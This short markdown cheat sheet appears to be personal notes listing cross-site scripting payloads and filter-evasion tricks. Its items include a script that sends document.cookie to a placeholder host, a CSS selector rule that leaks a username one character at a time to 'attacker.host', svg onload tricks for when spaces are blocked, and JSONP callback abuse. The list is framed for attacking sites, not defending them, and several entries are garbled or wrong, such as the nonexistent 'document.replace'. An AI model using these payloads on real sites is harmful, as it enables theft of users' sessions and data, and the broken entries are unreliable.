# XSS Payloads

1. `<script>alert(1)</script>`
2. `document.replace("attacker")` for if outbound is blocked
3. `XMLHTTP request`
4. `fetch` or `$.get` (fetch is built in)
5. `document.write('<img src="'+attack+'">"')`
6. `document.write('<img src="attacker" onerror="mallicious">')`
7. `<script>new Image().src = "fsfsfsfsfsfsd?"+document.cookie`
    - note that '//' is the default protocol i.e 'http://'
8. `<svg onload=''>`
    - note thst if spaces are blocked yu can do `<svg\onload="lol">`
9. jsonp `http://news.com/wethertype=jsonp&method=somefunction` runs function
    - use comma expressions to run whatever you want
10. templete literals :(
    - Array.join`${document.cookie}`
11. sometimes grab the enite page source rather then the cookie.
12. onload and onfocus to trigger
13. not xss but we can use css to send requests.
```css
#username[value^="a"] {
  background: url("https://attacker.host/mikeg");
}
```
you need to write a script to slowly guess the string each time.

14. polyglots 
